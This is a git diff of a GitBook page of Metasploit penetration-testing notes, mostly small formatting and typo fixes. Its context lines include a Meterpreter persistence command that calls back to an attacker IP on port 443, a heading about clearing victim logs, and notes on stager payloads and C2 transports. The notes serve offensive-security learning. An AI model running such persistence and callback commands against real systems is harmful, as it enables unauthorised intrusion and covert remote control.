@@ -1,5 +1,7 @@
 # ⭕ Metasploit
 
+
+
 ![](<../.gitbook/assets/image (282) (1) (1) (1) (1) (1) (1).png>)
 
 {% embed url="https://www.sans.org/blog/sans-pen-test-cheat-sheet-metasploit" %}
@@ -232,8 +234,6 @@ save state
 
 ## <mark style="color:red;">Types of Payloads</mark>
 
-Single, Stager, Stages
-
 ### <mark style="color:orange;">singles</mark>&#x20;
 
 * standalone and self-contained&#x20;
@@ -277,7 +277,7 @@ Single, Stager, Stages
 
 * windows stager based payloads
 * it works on every flavor and language of windows dating back to windows 9x without the explicit definition of a return address
-* extremely tiny it relies on the fact that ws2\_32.dll is loaded in the process being exploited before exploited.
+* extremely tiny, it relies on the fact that ws2\_32.dll is loaded in the process being exploited before exploited.
 * a bit less stable than other stagers
 
 {% hint style="info" %}
@@ -441,7 +441,7 @@ run persistence –A –L [directory to put payload] -X [connection attempt inte
  
 # for help:
 run persistance -h 
-#erun persistence –A –L c:\\ -X 30 –p 443 –r 192.168.1.113
+#run persistence –A –L c:\\ -X 30 –p 443 –r 192.168.1.113
 ```
 
 ## <mark style="color:red;">Clear Victim System Logs</mark>&#x20;
@@ -579,7 +579,7 @@ sleep 10 # sleep for 10 secs
 
 ## <mark style="color:red;">Transports</mark>
 
-Once Meterpreter shellcode has been run; whether from a phish, or some other means, it will reach out to the attacker’s Command and Control (C2) server over some network transport, such as HTTP, HTTPS or TCP. However, in an unknown environment, a successful connection is not guaranteed: firewalls, proxies, or intrusion prevention systems might all prevent a certain transport method from reaching out to the public Internet.Repeated trial and error is sometimes possible, but not always. For a phish, clicks come at a premium. Some exploits only give you one shot to get a shell, before crashing the host process.Meterpreter has the ability to have multiple “transports” in a single implant. A transport is the method by which it communicates to the Metasploit C2 server: TCP, HTTP, etc. Typically, Meterpreter is deployed with a single transport, having had the payload type set in msfvenom or in a Metasploit exploit module (e.g. meterpreter\_reverse\_http).
+Once Meterpreter shellcode has been run; whether from a phish, or some other means, it will reach out to the attacker’s Command and Control (C2) server over some network transport, such as HTTP, HTTPS or TCP. However, in an unknown environment, a successful connection is not guaranteed: firewalls, proxies, or intrusion prevention systems might all prevent a certain transport method from reaching out to the public Internet.Repeated trial and error is sometimes possible, but not always. For a phish, clicks come at a premium. Some exploits only give you one shot to get a shell, before crashing the host process. Meterpreter has the ability to have multiple “transports” in a single implant. A transport is the method by which it communicates to the Metasploit C2 server: TCP, HTTP, etc. Typically, Meterpreter is deployed with a single transport, having had the payload type set in msfvenom or in a Metasploit exploit module (e.g. meterpreter\_reverse\_http).
 
 #### But after a connection has been made between the implant and the C2 server, an operator can add additional, backup transports. This is particularly useful for redundancy: if one path goes down (e.g. your domain becomes blacklisted), it can fall back to another.
 
